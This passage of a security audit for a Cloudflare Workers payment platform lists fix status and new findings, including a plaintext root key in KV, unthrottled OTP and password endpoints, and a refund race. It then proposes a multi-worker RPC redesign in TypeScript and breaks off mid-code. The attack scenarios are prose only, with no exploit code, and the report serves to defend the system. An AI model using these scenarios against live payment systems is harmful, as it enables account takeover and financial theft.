| P0-005 | Bootstrap credential chain | P0 | **PARTIAL** | config centralization, prod CSPRNG | KV root key; oracle; KV-only lock; auto-bootstrap |
| P0-006 | Checkout XSS / no CSP | P0 | **FIXED** | full escaping + data-* + CSP | CSP unsafe-inline (hardening) |
| P0-007 | SMS null-amount bypass | P0 | **FIXED** | cmp() amount gate + strict corroboration | none material |
| P1-001 | Idempotency concurrency/scoping | P1 | **PARTIAL** | merchant scoping, 409, 4xx-no-cache, ON CONFLICT | concurrent double-execution; no endpoint scoping |
| P1-002 | OTP brute force | P1 | **NOT FIXED** | prod random OTP | no limiter mounted; 30d static token; dead config |
| P1-003 | Webhook size/ids/geo | P1 | **PARTIAL** | IP allowlists + layered ingress | no size cap; random event ids; geo fail-open |
| P1-004 | Outbound SSRF | P1 | **NOT FIXED** | — | full bypass catalogue remains |
| P1-005 | Cross-tenant admin escalation | P1 | **NOT FIXED** | CF Access gate (human path) | bearer path unchanged; provisioning returns root keys |
| P1-006 | Status regression / healing | P1 | **PARTIAL** | guarded failure writes; ledger-first | unguarded completion; no payment-row healing |
| P1-007 | createIntent atomicity | P1 | **PARTIAL** | UNIQUE constraint | 500 under race; orphan rows; no batch |
| P1-008 | Scope gaps | P1 | **PARTIAL** | refunds write, api-keys admin | payments + webhooks writable by read-only keys |
| P1-009 | Broken tests/lint | P1 | **PARTIAL** | test suites fixed (212 pass) | ESLint 9 config missing; stale docs |
| P1-010 | Rate limiting | P1 | **PARTIAL** | native per-key binding | install 120/min; anon surfaces unthrottled; KV race |
| P2-001 | CSRF dead code | P2 | **NOT FIXED** | — | never mounted |
| P2-002 | Fault seam magic env | P2 | **PARTIAL** | production guard + test | sentinel design |
| P2-003 | Platform merchant unverified | P2 | **NOT FIXED** | — | is_platform=0 filter |
| P2-004 | Webhook→platform merchant | P2 | **NOT FIXED** | — | ORDER BY is_platform DESC |
| P2-005 | RL binding fail-open | P2 | **UNCHANGED** | metric on degrade | documented decision |
| P2-006 | Analytics disabled | P2 | **NOT FIXED** | typed optional binding | commented in wrangler; metrics inert |
| P2-007 | No webhook outbox | P2 | **NOT FIXED** | — | crash window loses webhooks |
| P2-008 | Mirror dedup drops lines | P2 | **NOT FIXED** | — | NOT EXISTS w/o ordinal |
| P2-009 | Silent decrypt degradation | P2 | **NOT FIXED** | — | catch+skip everywhere |
| P2-010 | Key versioning/rotation | P2 | **NOT FIXED** | — | no envelope version |
| P2-011 | Break-glass timing/JWKS timeout | P2 | **NOT FIXED** | — | === compare; no AbortSignal |
| P2-012 | DO merchant self-check | P2 | **NOT FIXED** | — | no identity assertion |
| P2-013 | key_prefix UNIQUE | P2 | **NOT FIXED** | — | index only |
| P2-014 | Unbounded inputs | P2 | **NOT FIXED** | — | no size caps |
| P2-015 | SMS ReDoS | P2 | **NOT FIXED** | — | new RegExp on merchant patterns |
| P2-016 | Gateways fail-open default | P2 | **PARTIAL** | fail-closed on typos | unset = all |
| P2-017 | PBKDF2 50K/10K | P2 | **NOT FIXED** | — | comment drift; env floor 10K |
| P2-018 | Amount ceiling | P2 | **NOT FIXED** | DO MAX_AMOUNT at posting | no API-boundary cap |
| P2-019 | Currency exponents | P2 | **NOT FIXED** | param exists | callers hardcode 2 |
| P2-020 | Exchange rates validation | P2 | **NOT FIXED** | — | no timeout/sanity |
| P3-001 | Dead states | P3 | **NOT FIXED** | — | type-only |
| P3-002 | authSubject/device confusion | P3 | **NOT FIXED** | — | sub used as device_id |
| P3-003 | Notification ack cross-tenant | P3 | **NOT FIXED** | — | bare id IN |
| P3-004 | last_insert_rowid | P3 | **PARTIAL** | meta.last_row_id in refund/install | mobile.ts still legacy |
| P3-005 | Maintenance reason escape | P3 | **NOT FIXED** | — | raw interpolation |
| P3-006 | Mockup open proxy | P3 | **NOT FIXED** | — | 0.0.0.0 + unauth forward |
| P3-007 | secretToBytes heuristic | P3 | **NOT FIXED** | — | silent base64 decode |
| P3-008 | payload_hash 'system' | P3 | **NOT FIXED** | — | literal stored |
| P3-009 | Retry classification | P3 | **NOT FIXED** | — | 4xx retried |
| P3-010 | 409 string matching | P3 | **NOT FIXED** | — | by design |
| P3-011 | Parse-miss row fields | P3 | **PARTIAL** | nulls written first | cosmetic |
| P3-012 | Docs drift | P3 | **PARTIAL** | README/OpenAPI updated | stale counts; comment drift |

**Roll-up: 5 FIXED · 14 PARTIALLY FIXED · 30 NOT FIXED/UNCHANGED.**

**The pattern is unmistakable: every finding whose fix touches *money arithmetic, the ledger, or the payment lifecycle* was fixed with high-quality engineering and regression tests. Every finding whose fix touches *the trust perimeter* (secrets, admin tenancy, SSRF, OTP, scopes, input limits) was either untouched or cosmetically addressed.** The team should be commended for the former and held to account for the latter — especially because several perimeter fixes are *already written in the codebase and simply not wired up* (OTP/password limiter groups, CSRF middleware, Analytics binding).

---

# PART III — NEW FINDINGS INTRODUCED IN v0.3.0

---

# 10. New Findings

The rewrites introduced defects that did not exist (or were not applicable) in the previously audited version. They are numbered NEW-Px-yyy and follow the brief's finding format.

---

## 10.1 NEW-P1-001 — Plaintext platform-root API key persisted in Workers KV

```text
ID:          NEW-P1-001
Severity:    P1 (High)
Category:    Secrets Management
File:        src/services/bootstrap.ts
Function:    ensureSystemBootstrapped()
Lines:       205

Title:       Auto-bootstrap writes a '*'-scoped API key, unencrypted, into a
             globally-readable KV namespace

Threat / Failure Scenario:
    Any principal with KV read access to the deployment's KV namespace
    (dashboard operator, leaked API token, a future route that exposes KV
    reads, a compromised co-tenant script) reads system:root_api_key and
    obtains platform-root credentials: create merchants, read all tenants,
    trigger refunds, forge mobile JWTs.

Root Cause:
    The bootstrap path persists the generated key for "recovery" purposes
    instead of displaying it exactly once (like POST /install does) and
    storing only its SHA-256 (like op_api_keys does).

Existing Guard:
    KV is not exposed via any HTTP route today (grep: no KV.get route
    returns system:* keys). The value is write-only in code.

Why the Guard Is / Is Not Sufficient:
    The guard is positional, not structural: it depends on no future code
    ever reading that key and on KV access itself being perfectly managed.
    A root credential that "should not exist" is strictly worse than one
    that is hashed at rest.

Impact:
    Full platform compromise from a KV read.

Exploitability:
    Low today (requires KV access); the exposure is a dormant landmine.

Evidence:
    bootstrap.ts:205  `await env.KV.put('system:root_api_key', newApiKey);`
    grep system:root_api_key → write-only (no reader).

Recommended Fix:
    Delete the KV write. If operator recovery is required, re-use the
    /install/bootstrap-key flow (credential exchange) instead of storing
    the secret. Purge the key from existing deployments' KV.

Regression Test:
    After bootstrap, assert KV contains no system:root_api_key value
    (tests/setup can read the KV namespace).

Migration Required:  No.
Verdict: FAIL (secrets posture)
```

---

## 10.2 NEW-P1-002 — Credential-verification endpoints shipped with dead (unmounted) rate-limit configuration

```text
ID:          NEW-P1-002
Severity:    P1 (High)
Category:    Abuse / Brute Force
Files:       src/middleware/rate-limit.ts (lines 33-40), src/index.ts
             (mount list, line 185), src/controllers/install.ts
             (bootstrap-key, line 240), src/controllers/mobile.ts (pair, 19)

Title:       'otp' and 'password' limiter groups exist but are mounted
             nowhere; bootstrap-key and OTP pairing are effectively
             unthrottled credential-guessing oracles

Threat / Failure Scenario:
    (a) /install/bootstrap-key accepts unlimited admin email+password
        guesses (bounded only by the 'install' group at 120/min/IP and
        PBKDF2 cost ~10-30ms → dozens of guesses/sec/IP).
    (b) /api/mobile/v1/pair accepts unlimited 6-digit OTP guesses
        (1,000,000 keyspace; token valid 30 days → guaranteed compromise
        in hours at even 100 guesses/sec).

Root Cause:
    Configuration-as-security theatre: ANON_ROUTE_LIMITS defines
    'otp' (10/hour) and 'password' (10/hour) groups, but the only group
    ever mounted is 'install'. The dangerous routes were never wired.

Existing Guard:
    'install' group on /install* (120/min/IP) — the wrong limit class for
    a credential endpoint.

Why the Guard Is / Is Not Sufficient:
    120/min is a throughput limit, not a credential-guessing limit. A
    10/hour class is the correct bound and was already written.

Impact:
    Admin account takeover via bootstrap-key; merchant SMS-relay takeover
    via pairing OTP (the paired device receives all merchant SMS content).

Exploitability:
    High — both routes are anonymous, JSON, and trivially scriptable.

Evidence:
    rate-limit.ts:38-39 ('otp', 'password' groups defined);
    index.ts:185 (only 'install' mounted);
    install.ts:240 (bootstrap-key route, no limiter);
    mobile.ts:19 (pairing route, no limiter).

Recommended Fix:
    app.use('/install/bootstrap-key', perIpRateLimit('password'));
    app.use('/api/mobile/v1/pair*', perIpRateLimit('otp'));
    Plus per-token attempt counters (D1 column on
    op_device_pairing_tokens; 5 strikes → revoke).

Regression Test:
    6th OTP guess within the hour → 429 (extend tenant-routing-style
    harness); 11th bootstrap-key attempt → 429.

Migration Required:  No (attempt-counter column optional).
Verdict: FAIL (abuse protection)
```

---

## 10.3 NEW-P2-001 — Refund cumulative-bound check is raceable (TOCTOU)

```text
ID:          NEW-P2-001
Severity:    P2 (High-Medium) — financial bound integrity
Category:    Concurrency / Money Integrity
File:        src/services/refund.ts
Function:    RefundService.createRefund()
Lines:       79-101

Threat / Failure Scenario:
    Captured = 100.00. Two concurrent POST /refunds each request 60.00.
    Both SELECT SUM(prior refunds) → 0. Both pass 0+60 <= 100+0.001.
    Both INSERT. Total refunds = 120.00 > 100.00 captured. Over-refund;
    the ledger posts both reversals (each individually well-formed) and
    the clearing account can go negative; the gateway is asked for 120 of
    a 100 capture (provider-side rejection is the only backstop, and for
    manual gateways there is none).

Root Cause:
    The bound is enforced by a read-then-write sequence with no
    serialization: no D1 constraint, no DO serialization, no batch/txn
    wrapping the check with the insert.

Existing Guard:
    Idempotency middleware (different keys bypass); workflow-level
    serialization (happens later, after the rows exist); DO balance guard
    (only rejects negative *ledger* balances, not refund-vs-captured).

Why the Guard Is / Is Not Sufficient:
    Every guard sits after the race window. The check itself is the
    invariant and it is not atomic.

Impact:
    Refund exceeding captured amount under concurrent requests; book
    imbalance (clearing negative); merchant financial loss.

Exploitability:
    Requires a merchant API key with write scope — an attacker with a
    compromised key can deliberately race their own refunds.

Evidence:
    refund.ts:80-87 (SELECT SUM), refund.ts:97 (code check),
    refund.ts:129-148 (INSERT, separate statement).
    No UNIQUE/CHECK on op_refunds (migration 0001:316-323; 0004 adds only
    an index).

Recommended Fix (choose one, ordered by preference):
    1. Move the bound check + insert inside a D1 batch with a conditional
       insert:
         INSERT INTO op_refunds (...) SELECT ... WHERE
           (SELECT COALESCE(SUM(CAST(amount AS NUMERIC)),0) FROM op_refunds
            WHERE transaction_id=? AND merchant_id=?
              AND status IN ('completed','pending','processing'))
           + ? <= (SELECT CAST(amount AS NUMERIC) FROM op_transactions
                   WHERE id=?) + 0.001;
       (D1/SQLite serializes writes per database — the conditional insert
       closes the race.)
    2. Serialize per-transaction in the RefundReconciliationWorkflow's
       first step (instance-per-transaction), performing the check inside
       the workflow where retries are durable.
    3. A REFUND_LIMITS table holding per-transaction remaining amounts,
       updated with a guarded UPDATE ... WHERE remaining >= ? (optimistic
       decrement).

Regression Test:
    Fire 10 concurrent partial refunds summing to > captured; assert
    exactly the bounded subset lands (extend payment-integrity harness
    which already boots real workerd + D1).

Migration Required:  No (option 1). Option 3 adds a table.
Verdict: FAIL (concurrent refund bound)
```

---

## 10.4 NEW-P2-002 — Float arithmetic in money-bound checks (inconsistent with the codebase's own decimal discipline)

```text
ID:          NEW-P2-002
Severity:    P2
Category:    Money / Decimal Safety
Files:       src/services/payment.ts:316-319 (handleCallback amount check),
             src/services/refund.ts:82-101 (refund bound check)

Title:       parseFloat + ±0.001 tolerance used for amount-equality and
             refund-bound decisions while lib/money.ts provides exact
             decimal cmp()

Threat / Failure Scenario:
    Amount strings beyond float precision (e.g. "99999999999999.99" or
    3-dp-adjacent values) compare incorrectly; a crafted amount within
    0.001 of the intent amount but not equal (e.g. 100.001 vs 100.00 in a
    3-dp gateway echo) passes the "equality" check. Small, but this is
    precisely the class of bug the strict decimal helpers exist to
    prevent, and the same file imports cmp() for other checks.

Root Cause:
    Fix written under time pressure; the strict helper (cmp) was used in
    checkout.ts:192 but not in payment.ts/refund.ts.

Existing Guard:
    NaN guard (isNaN) in handleCallback; regex at API entry limits to 2dp
    (so float representation is exact for realistic magnitudes).

Why the Guard Is / Is Not Sufficient:
    The tolerance ±0.001 is itself a policy deviation: two Money values
    that are not equal are being treated as equal. For a payment system,
    the default must be exact equality; tolerance (if any) must be an
    explicit, documented policy per currency.

Impact:
    Latent precision/laxity bug in two money-critical comparisons.

Exploitability:
    Low with current 2dp gateways; grows with exotic currencies/amounts.

Recommended Fix:
    payment.ts:  if (verifyResult.amount) {
                   if (cmp(verifyResult.amount, intent.amount) !== 0) ... }
    refund.ts:   use Decimal (decimal.js is already a dependency) for
                 SUM comparison: toMinorUnits + integer comparison.

Regression Test:
    handleCallback with amount "100.001" vs intent "100.00" → rejected
    (currently passes!).

Verdict: FAIL (decimal discipline), severity tempered by entry regex.
```

---

## 10.5 NEW-P2-003 — Amount-binding check silently skipped when the adapter returns no amount

```text
ID:          NEW-P2-003
Severity:    P2
Category:    Payment Integrity
File:        src/services/payment.ts:314-325

Title:       `if (verifyResult.amount)` — completion proceeds without
             amount verification whenever the adapter fails to echo the
             paid amount (P0-004 residual formalized)

Threat / Failure Scenario:
    Any adapter or provider response path that omits `amount` (manual
    gateways, provider API changes, error-shape responses parsed as
    success) re-opens the P0-004 substitution window: complete an
    arbitrary-amount intent with a microscopic payment.

Root Cause:
    The fix is conditional on provider behavior rather than being a
    completion precondition.

Existing Guard:
    Signature verification (adapter-level); SMS path and webhook path
    enforce the DB amount independently.

Why the Guard Is / Is Not Sufficient:
    For the redirect-callback path, the amount check is the ONLY guard
    (trx_id is not populated by BD adapters). Making it conditional makes
    the strongest guard optional.

Recommended Fix:
    For gateway type 'api': require (verifyResult.amount != null) for
    completion; null → treat as 'pending_manual_review' rather than
    complete. Manual gateways keep the SMS corroboration path.

Regression Test:
    Mock adapter returning success + amount null → completion must NOT
    occur (checkout status remains non-completed).

Verdict: CONDITIONAL
```

---

## 10.6 NEW-P2-004 — Root-key harvesting preserved in tenant provisioning response (P1-005's fix carrier)

```text
ID:          NEW-P2-004
Severity:    P2 (was the P1-005 carrier; kept P2 here because it is the
             data-exposure half — the authorization half remains P1-005)
File:        src/controllers/admin-api.ts:358-369

Title:       POST /api/admin/v1/merchants returns api_key, pairing_otp,
             and webhook_secret in cleartext

Recommended Fix:
    One-time claim flow: return a claim_token (single-use, 15-min TTL,
    KV/D1), and reveal credentials only on POST /merchants/{id}/claim
    with the token; or require the operator to supply credentials
    out-of-band. Never persist or re-serve them.

Verdict: FAIL (credential exposure pattern)
```

---

## 10.7 NEW-P2-005 — Checkout verification endpoints are unthrottled TrxID oracles

```text
ID:          NEW-P2-005
Severity:    P2
Files:       src/controllers/checkout.ts (POST /:token/verify,
             GET /:token/status)

Title:       Anonymous, unthrottled endpoints enable TrxID enumeration and
             resource abuse

Details:
    /checkout/:token/verify accepts unlimited TrxID submissions per IP
    (each does 2-4 D1 queries); /status is polled every 2s by the page
    itself. An attacker can brute TrxIDs across tokens (each probe
    returns distinct errors for used-vs-missing TrxIDs — an oracle), and
    can hammer status polling. TRX_ALREADY_USED vs NOT_FOUND responses
    leak TrxID existence across merchants.

Recommended Fix:
    Mount a per-IP (or per-token) KV limiter ('checkout' group, e.g.
    30/10min for verify); collapse error responses to a single generic
    message; add jittered backoff to the page's polling.

Verdict: FAIL (abuse hardening)
```

---

## 10.8 NEW-P2-006 — `handleCallback` intent lookup and completion are not merchant-bound at the DB layer

```text
ID:          NEW-P2-006
Severity:    P2 (defense-in-depth)
File:        src/services/payment.ts:275-291

Title:       handleCallback's intent SELECT has no merchant predicate; the
             token is the only binder

Details:
    The callback resolves the intent by token alone (correct — tokens are
    unguessable random UUIDs), but every subsequent statement
    (transaction load, ledger posting, status batch) keys on ids derived
    from that single lookup. A future refactor that loosens token
    generation (or a token leak) immediately becomes cross-tenant
    completion with no second predicate. Cheap hardening: add
    `AND merchant_id = ?` to the callback intent SELECT using the domain
    middleware's merchant, when present.

Verdict: CONDITIONAL
```

---

## 10.9 NEW-P3-001 — Dead call in corroboration gateway resolution

```text
sms-corroboration.ts:152:  const senderGateway = verifiedGatewaySlug ??
    senderToGatewaySlug(null);   // senderToGatewaySlug(null) === null always
Harmless dead code; remove the second operand.
```

## 10.10 NEW-P3-002 — ESLint 9 flat-config migration incomplete

```text
package.json "lint": "eslint src --ext .ts" fails: ESLint 9 requires
eslint.config.js. Ship a flat config (typescript-eslint recommended,
~20 lines) and re-enable lint in CI. Until then the "lint" script is
documentation, not a control.
```

## 10.11 NEW-P3-003 — Comment/code drift persisted in three hot spots

```text
index.ts:181    comment "3/hour"    vs rate-limit.ts:37  120/min
crypto.ts:11    comment "600,000"   vs crypto.ts:28      50,000
TEST_RESULTS.md "104 tests"         vs actual            212
Regenerate docs from CI; add a docs-claim lint.
```

## 10.12 NEW-P3-004 — `moneySchema` permits arbitrarily large magnitudes (P2-018's schema carrier)

```text
validation.ts:20-22: /^\d+(\.\d{1,2})?$/ — unbounded integer part. Add:
  .refine(v => { const n = Number(v); return Number.isFinite(n) &&
                 n > 0 && n <= 90_000_000; }, 'amount out of range')
(matches the DO's MAX_AMOUNT_MINOR so the API never accepts an unsettleable
payment).
```

---

# PART IV — ARCHITECTURE

---

# 11. Current Architecture Reconstruction (What Actually Exists)

## 11.1 The single-worker reality

```text
                        ┌──────────────────────────────────────────────┐
                        │            ONE Worker: edgepay-cf            │
                        │  (src/index.ts — Hono app + DO + Workflows)  │
                        └──────────────────────────────────────────────┘
   Internet ──fetch──▶  routes:
                          /install/*                 (anonymous wizard)
                          /api/v1/*                  (merchant bearer keys)
                          /api/mobile/v1/*           (mobile JWTs)
                          /api/admin/v1/*            (Access JWT + admin keys)
                          /api/openapi.json, /api/reference
                          /checkout|/invoice|/pay/:token   (public HTML)
                          /webhook/:gateway          (provider ingress)
                          /assets/*                  (static)
                          + scheduled (3 crons)
                          + queue consumers (webhook-out, email-out, sms-parse)
                          + LedgerDO (per merchant)  + 2 Workflows
```

**There are no Service Bindings (`services` block absent from all three wrangler configs), no Worker-to-Worker RPC, and no separate frontend workers.** The four-worker topology the documentation gestures at does not exist in code. The unit of deployment is one script containing every privilege level: public checkout, merchant API, mobile API, admin API, platform provisioning, queue consumers, cron, the ledger Durable Object, and both Workflows.

## 11.2 Bindings inventory (wrangler.jsonc)

| Binding | Type | Used by | Notes |
|---|---|---|---|
| DB | D1 | everything | schema 0001-0004; single shared database for all tenants incl. platform |
| KV | KV namespace | domain cache, bootstrap flags, token cache, rate-limit counters, root key (NEW-P1-001) | |
| R2 | bucket | uploads/receipts | lightly used |
| WEBHOOK_QUEUE / EMAIL_QUEUE / SMS_QUEUE | Queues (+DLQs) | dispatcher → consumers | max_retries 3/5/3 |
| LEDGER_DO | Durable Object | ledger | one instance per merchant (SQLite-backed, new_sqlite_classes v1) |
| REFUND_WORKFLOW / SWEEP_WORKFLOW | Workflows | refunds, daily sweep | |
| RATE_LIMIT_READ / RATE_LIMIT_WRITE | Ratelimit bindings | per-key API limits | 120/60s, 30/60s |
| ASSETS | Static assets | /assets/* | run_worker_first = true |
| ANALYTICS | Analytics Engine | — | **commented out** (P2-006) |
| AI | Workers AI | — | **commented out** (parser tier 3 fallback inert) |

## 11.3 Trust boundaries as implemented

```text
Internet ─ [B1: Cloudflare edge / Access proxy] ─ Worker process
B2: domainMiddleware        (Host → merchant context)
B3: accessAuthMiddleware    (/api/admin/* — JWKS-verified JWT or admin bearer)
B4: requireBearerApiAuth    (/api/v1/* — per-key hash + scope + tenant match)
B5: requireJwtAuth          (/api/mobile/v1/* — HS256 JWT)
B6: adapter.verifyWebhook   (/webhook/* — HMAC per gateway)
B7: checkout token          (/checkout/:token — random unguessable token)
B8: LedgerDO RPC            (internal — no authn of its own: P2-012)
```

Everything inside B2-B7 executes in **one isolate with one set of bindings**. A compromise of any code path that can reach D1/KV/DO — e.g. via the read-only-key scope gaps (P1-008) or the admin escalation (P1-005) — reaches *everything*. This is the architectural fact that motivates Part IV.

---

# 12. The Documented-vs-Actual Four-Worker Topology Gap

The audit brief states the repository documentation "proposes a topology consisting of edgepay-customer / edgepay-merchant / edgepay-admin / edgepay-core with Service Bindings / Worker RPC between the frontend workers and the core engine" and instructs to treat it as a **design claim to verify**.

Verification result:

| Claim | Reality in v0.3.0 |
|---|---|
| Customer worker serving checkout only | **Absent** — checkout served by the monolith |
| Merchant worker for merchant APIs | **Absent** — /api/v1 in the monolith |
| Admin worker behind Cloudflare Access | **Partially present** — Access middleware exists, but inside the monolith |
| Core engine exposing only intended RPC | **Absent** — no service bindings anywhere; the "core" is the same script |
| Admin/merchant operations private/internal | **False** — every route is public-facing on the same origin |

**Material mismatch (per brief §5: "Report every material mismatch"):** the claimed topology is 0% implemented. The only genuine split that exists is *within-process* (middleware gates), not *between-process* (network-isolated workers with separate bindings).

This is not merely cosmetic: the single-worker design means (a) the checkout HTML surface and the platform provisioning API share an origin and a blast radius; (b) per-surface rate limiting, WAF rules, and Access policies cannot be applied independently; (c) a code-execution bug in any public template renderer (checkout!) executes with D1+KV+DO+queue credentials attached; (d) deployment of a checkout CSS change ships the refund engine.

---

# 13. THE MULTI-WORKER FRONTEND SYSTEM — FULL IMPLEMENTATION BLUEPRINT

This section is the direct answer to the commissioning question: *"how we should implement the multi-worker frontend system."* It is a concrete, phased, code-level plan to decompose the monolith into the four-worker topology, using **Cloudflare Service Bindings with Worker RPC** as the inter-worker transport.

## 13.1 Design goals (in priority order)

```text
G1  Blast-radius isolation: a compromise of a public frontend surface must
    NOT carry D1/KV/DO/queue credentials.
G2  Privilege minimization per surface: the customer worker holds no
    merchant secrets at all; the merchant worker holds no platform powers.
G3  Keep the proven core: LedgerDO posting protocol, refund workflow, and
    reconciliation move into edgepay-core with minimal changes (they are
    the strongest code in the repo — do not rewrite them).
G4  One source of truth for the REST contract: customers/merchants see a
    reduced, versioned REST surface; everything else becomes typed RPC.
G5  Independent deployability: checkout UI deploys without touching the
    ledger; admin UI deploys without touching gateways.
G6  No cross-worker trust by position: every RPC method re-establishes
    caller identity and tenant context server-side (brief §7 rule: "a
    typed interface is NOT itself an authorization boundary").
```

## 13.2 Target topology

```text
                              ┌────────────────────────┐
                              │  Cloudflare Edge / WAF  │
                              │  (per-hostname routes)  │
                              └───────────┬────────────┘
      pay.merchant.com                    api.edgepay.com           admin.edgepay.io
   checkout / invoice / pay           REST API (reduced)         Access-gated dashboard
          │                                   │                            │
┌─────────▼──────────┐          ┌──────────────▼─────────────┐  ┌──────────▼───────────┐
│  edgepay-customer  │          │      edgepay-merchant      │  │    edgepay-admin     │
│  (frontend worker) │          │  (merchant REST frontend)  │  │ (admin frontend)     │
│                    │          │                            │  │ Cloudflare Access    │
│ Bindings: NONE to  │          │ Bindings: CORE (RPC only)  │  │ Bindings: CORE (RPC) │
│ data stores        │          │ (no D1/KV/DO/queues)       │  │                      │
└─────────┬──────────┘          └──────────────┬─────────────┘  └──────────┬───────────┘
          │ service binding: CORE_RPC (subset) │ service binding: MERCHANT_RPC     │ CORE_ADMIN_RPC
          └────────────────┬───────────────────┴──────────────────────────────┘
                           ▼
              ┌──────────────────────────────────────────┐
              │               edgepay-core               │
              │  Bindings: DB (D1), KV, R2, LEDGER_DO,   │
              │  REFUND_WORKFLOW, SWEEP_WORKFLOW,        │
              │  WEBHOOK_QUEUE, EMAIL_QUEUE, SMS_QUEUE,  │
              │  RATE_LIMIT_*, gateways/*                │
              │  NO public routes except:                │
              │    /webhook/:gateway  (provider ingress) │
              │    /internal/health (binding-authed)     │
              │  Exposes: typed Worker RPC (RcpCore)     │
              └──────────────────────────────────────────┘
```

Key property: **only edgepay-core holds data-plane bindings.** The three frontend workers hold exactly one binding each — the service binding to core — plus their own static assets. This is what turns "the admin API is behind a middleware" into "the admin API is behind a *network* boundary with its own deploy, its own Access policy, and zero database credentials."

## 13.3 The RPC contract (the single inter-worker API)

Worker RPC (stably supported since 2024; the repo's compatibility date 2026-08-28 is fine) lets a service binding call methods on the target worker's `default` export directly — typed, no HTTP serialization, no auth headers to forge, and **not reachable from the public internet** (bindings are account-scoped).

### 13.3.1 The interface (new package `packages/core-rpc` shared by all four workers)

```ts
// packages/core-rpc/index.ts — the ONLY inter-worker contract
export interface CallerContext {
  /** which frontend worker is calling (asserted by core, not trusted from arg) */
  worker: 'customer' | 'merchant' | 'admin';
  /** merchant tenant, when established */
  merchantId: number | null;
  /** authenticated principal (api key row id / user id / device id) */
  subject: number | null;
  /** scopes established by the frontend's own auth layer */
  scopes: string[];
  /** request id for tracing */
  requestId: string;
}

export interface CreatePaymentRequest {
  ctx: CallerContext;
  amount: string;               // strict 2dp decimal string, <= ceiling
  currency: string;             // ISO 4217
  description?: string;
  customer?: { name?: string; email?: string; phone?: string };
  gatewayId?: number;
  metadata?: Record<string, unknown>;
  expiresInSeconds?: number;
  idempotencyKey?: string;
}

export interface PaymentIntentView {
  intentId: number; token: string; checkoutUrl: string;
  amount: string; currency: string; status: string;
}

export interface CoreRpc {
  // ---- customer-worker surface (token-bound, zero credentials) ----
  getCheckoutView(token: string): Promise<CheckoutView>;
  initiateGatewayPayment(token: string, gatewayId: number): Promise<InitiateResult>;
  submitTrxForVerification(token: string, trxId: string, senderPhone: string | null): Promise<VerifyStatus>;
  pollCheckoutStatus(token: string): Promise<{ status: string; trxId: string | null }>;
  handleGatewayCallback(token: string, params: Record<string, unknown>): Promise<{ ok: boolean; status: string }>;

  // ---- merchant-worker surface (scope-checked in core) ----
  createPayment(req: CreatePaymentRequest): Promise<PaymentIntentView>;
  getPayment(ctx: CallerContext, paymentId: number): Promise<PaymentView | null>;
  listTransactions(ctx: CallerContext, q: ListQuery): Promise<Page<TransactionView>>;
  createRefund(ctx: CallerContext, input: RefundInput & { idempotencyKey: string }): Promise<RefundView>;
  listWebhooks(ctx: CallerContext): Promise<WebhookView[]>;
  registerWebhook(ctx: CallerContext, input: { url: string; events: string[] }): Promise<WebhookView>;
  deleteWebhook(ctx: CallerContext, webhookId: number): Promise<void>;
  listGateways(ctx: CallerContext): Promise<GatewayView[]>;
  createApiKey(ctx: CallerContext, input: { name: string; scopes: string[] }): Promise<{ id: number; key: string }>;

  // ---- admin-worker surface (platform scope-checked in core) ----
  listMerchants(ctx: CallerContext): Promise<MerchantSummary[]>;
  provisionMerchant(ctx: CallerContext, input: ProvisionInput): Promise<ProvisionResult>;
  triggerReconciliation(ctx: CallerContext): Promise<{ runId: string }>;
  trialBalance(ctx: CallerContext, merchantId: number): Promise<TrialBalanceView>;
  refundAdmin(ctx: CallerContext, input: AdminRefundInput): Promise<RefundView>;

  // ---- health ----
  coreHealth(): Promise<{ ok: true; version: string }>;
}
```

### 13.3.2 Core implementation skeleton

```ts
// workers/edgepay-core/src/index.ts
import { Hono } from 'hono';
import { LedgerDO } from './do/ledger-do';
import { RefundReconciliationWorkflow } from './workflows/refund-reconciliation';
import { ReconciliationSweepWorkflow } from './workflows/reconciliation-sweep';
import { webhookRoutes } from './routes/webhooks';        // public provider ingress (unchanged)
import { Env } from './types/env';

export class RcpCore implements CoreRpc {          // ← RPC entrypoint
  constructor(private env: Env, private ctx: ExecutionContext) {}

  async createPayment(req: CreatePaymentRequest): Promise<PaymentIntentView> {
    // G6: re-establish authorization INSIDE core — never trust ctx.scopes
    const auth = await authorize(this.env, req.ctx, 'write');   // loads the key by subject, re-checks scopes + merchant
    if (!auth.ok) throw new RpcAuthError(auth.code);

    // ceiling check at the boundary (NEW-P3-004 / P2-018)
    if (!amountWithinCeiling(req.amount)) throw new RpcValidationError('AMOUNT_OUT_OF_RANGE');

    // existing PaymentService.createIntent — moved wholesale into core
    const svc = new PaymentService(this.env);
    const r = await svc.createIntent({ ...req, merchant_id: auth.merchantId });
    return { intentId: r.intent_id, token: r.token, checkoutUrl: r.checkout_url, ... };
  }
  // ... every method: authorize() first, then delegate to the existing
  // services (PaymentService, RefundService, LedgerService, ...) unchanged
}

const app = new Hono<{ Bindings: Env }>();
app.route('/webhook', webhookRoutes);              // ONLY public route
app.get('/internal/health', (c) => c.json({ ok: true }));

export default {
  async fetch(req: Request, env: Env, ctx: ExecutionContext) { return app.fetch(req, env, ctx); },
  async queue(batch: MessageBatch, env: Env, ctx: ExecutionContext) { /* moved consumers */ },
  async scheduled(ctrl: ScheduledController, env: Env, ctx: ExecutionContext) { /* moved crons */ },
  async rpc(env: Env, ctx: ExecutionContext) { return new RcpCore(env, ctx); },  // RPC export
} satisfies ExportedHandler<Env, CoreRpc>;         // ← typed RPC satisfies the shared interface

export { LedgerDO, RefundReconciliationWorkflow, ReconciliationSweepWorkflow };
```

### 13.3.3 The critical security rule — RPC authorization is core-side

Worker RPC bindings are **private by position** (only workers in the same account with the binding can call), but the brief's §7 rule applies: a typed interface is not an authorization boundary. Core therefore:

```ts
async function authorize(env: Env, ctx: CallerContext, need: 'read' | 'write' | 'admin' | 'platform') {
  // 1. NEVER trust ctx.worker — core cannot see the caller's script name
  //    directly, so each frontend signs its context with a per-worker
  //    shared secret bound via wrangler secrets (WORKER_AUTH_SECRET_CUSTOMER
  //    etc.). Core verifies an HMAC over the context blob:
  const sig = ctx.sig;  // added by the frontend wrapper
  const expected = await hmacSha256(canonical(ctx), secretFor(ctx.worker));
  if (!timingSafeEqual(sig, expected)) return { ok: false, code: 'BAD_CALLER' };

  // 2. Re-load the principal from D1 by subject id (scope, status, expiry,
  //    merchant binding) — exactly requireBearerApiAuth's logic, minus the
  //    HTTP parsing.
  // 3. Check the needed scope level. 'platform' additionally requires the
  //    key's merchant is_platform = 1  ← closes EDGE-P1-005 structurally.
}
```

Note on `ctx.worker`: Cloudflare does stamp `CF-Worker` on service-binding subrequests, but treat that as telemetry — the HMAC proves the caller.

### 13.3.4 Frontend call pattern (merchant worker example)

```ts
